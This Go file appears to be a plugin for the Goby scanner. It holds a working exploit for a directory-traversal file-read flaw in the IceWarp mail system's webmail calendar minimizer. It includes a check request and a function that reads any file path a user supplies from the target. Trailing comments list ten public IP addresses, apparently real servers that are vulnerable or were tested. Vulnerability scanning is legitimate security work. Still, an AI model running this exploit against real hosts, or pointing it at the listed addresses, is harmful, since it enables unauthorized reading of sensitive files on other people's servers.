package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "IceWarp mail system Local File Inclusion",
    "Description": "Local files contain vulnerabilities, which can be used to read arbitrary files, such as sensitive files such as system configuration, with the help of directory traversal vulnerabilities, and may even cause system collapse.",
    "Product": "IceWarp-Product",
    "Homepage": "https://www.icewarp.com/",
    "DisclosureDate": "2021-06-01",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "(app=\"ICewarp-Company Products\" || app=\"ICewarp-server\")",
    "Level": "3",
    "Impact": "<p>1. Include locally sensitive files, such as Web applications, database configuration files and CONFIG files.</p><p>2. Cooperating with upload vulnerability and directory traversal vulnerability can lead to system collapse.</p>",
    "Recommendation": "<p>1. Check whether the contained content is controlled by the user, if so, then strictly filter it.</p><p>2. Upgrade to the latest version.</p>",
    "References": [
        "https://www.exploit-db.com/exploits/46959"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "WINDOWS\\system32\\drivers\\etc\\hosts"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "File Inclusion"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10214"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg_get := httpclient.NewGetRequestConfig("/webmail/calendar/minimizer/index.php?style=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")
			cfg_get.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg_get.FollowRedirect = false
			cfg_get.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg_get); err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "This is a sample HOSTS file used by") && strings.Contains(resp.Utf8Html, "Microsoft Corp"))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			cfg_get := httpclient.NewGetRequestConfig("/webmail/calendar/minimizer/index.php?style=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C" + url.QueryEscape(filePath))
			cfg_get.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg_get.FollowRedirect = false
			cfg_get.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_get); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}

// 194.106.162.40
// 213.81.207.100
// 92.42.37.214:8181
// 92.42.37.31:8181
// 92.42.37.213:8181
// 88.129.214.20
// 210.2.86.92:8080
// 125.7.185.98
// https://185.56.159.18
// https://77.245.152.171
